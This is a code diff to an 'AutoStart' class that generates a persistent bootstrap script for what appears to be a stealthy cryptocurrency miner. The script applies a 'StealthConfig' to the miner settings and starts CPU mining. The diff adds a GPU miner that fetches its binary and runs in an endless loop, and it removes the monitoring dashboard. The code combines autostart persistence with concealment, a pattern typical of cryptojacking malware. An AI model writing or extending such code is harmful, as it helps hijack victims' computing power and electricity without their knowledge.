@@ -31,13 +31,12 @@ class AutoStart:
     def _write_bootstrap(self) -> Path:
         script = self._bootstrap_path()
         code = (
-            "import sys, pathlib\n"
+            "import sys, pathlib, time\n"
             f"sys.path.insert(0, {str(self.base_dir)!r})\n"
             "from core.miner import MinerManager\n"
+            "from core.gpu_miner import GPUMinerManager\n"
             "from core.config import ConfigBuilder\n"
             "from core.stealth import StealthConfig\n"
-            "from core.dashboard import DashboardServer\n"
-            "import json, threading, time\n"
             "\n"
             f"base = pathlib.Path({str(self.base_dir)!r})\n"
             "mgr = MinerManager(base)\n"
@@ -48,8 +47,11 @@ class AutoStart:
             "cfg = sc.apply_to_config(cfg)\n"
             "mgr.write_config(cfg)\n"
             "mgr.start()\n"
-            "ds = DashboardServer(mgr)\n"
-            "ds.start()\n"
+            "gpu = GPUMinerManager(base)\n"
+            "gpu.ensure_binary()\n"
+            "gpu_cfg = cb.build_gpu_config()\n"
+            "gpu.configure(**gpu_cfg)\n"
+            "gpu.start()\n"
             "while True:\n"
             "    time.sleep(60)\n"
         )
